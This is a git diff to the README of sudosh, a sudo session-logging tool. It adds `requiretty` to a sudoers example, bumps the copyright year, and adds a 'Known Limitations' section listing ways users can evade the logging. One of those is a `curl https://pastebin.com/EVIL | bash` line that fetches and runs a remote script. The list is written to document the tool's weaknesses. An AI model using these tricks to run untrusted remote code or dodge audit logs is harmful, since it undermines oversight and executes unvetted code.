@@ -50,6 +50,8 @@ Using `sudosh` provides a more secure alternative that cannot be bypassed since 
 
 ## Usage
 
+
+
 Here's how to use it in 3 easy steps. 
 Checkout the [precompiled releases](https://github.com/cloudposse/sudosh/releases) 
 if you don't want to build it yourself...:
@@ -57,7 +59,7 @@ if you don't want to build it yourself...:
 1. Enable `sudo` logging. Edit `/etc/sudoers.d/sudosh`:
 
   ```
-  Defaults log_output
+  Defaults log_output requiretty
   Defaults!/usr/bin/sudoreplay !log_output
   Defaults!/sbin/reboot !log_output
   ```
@@ -78,6 +80,17 @@ if you don't want to build it yourself...:
   echo 'foobar ALL=(foobar) ALL' > /etc/sudoers.d/sudosh-foobar
   ```
   **NOTE:** filenames in `sudoers.d` cannot contain the `.` character
+
+
+## Known Limitations
+
+* Without `requiretty` users can easily circumvent logging of `stdin` by running `ssh user@host bash`. 
+* Using `requiretty`, will require passing a pseudo TTY, which is easily accomplished by instead running `ssh -tt user@host bash`
+* Users can easily circumvent logging of `stdin` by running `stty -echo`, however, you'll see the command run to disable it. =)
+* Users can easily run scripts (e.g. `curl https://pastebin.com/EVIL | bash`) which would circumvent the ability to see what was executed
+* There are 1000+ ways bad actors can circumvent *any* form of TTY logging. 
+* Using this method of session logging only recommended to keep an *honest* log of what happened.
+* Capturing a byte-for-byte session log requires extension of the SSH server or perhaps a custom shell built specificically for that purpose. 
 
 
 
@@ -144,7 +157,7 @@ In general, PRs are welcome. We follow the typical "fork-and-pull" Git workflow.
 
 ## Copyright
 
-Copyright © 2017-2018 [Cloud Posse, LLC](https://cpco.io/copyright)
+Copyright © 2017-2019 [Cloud Posse, LLC](https://cpco.io/copyright)
 
 
 
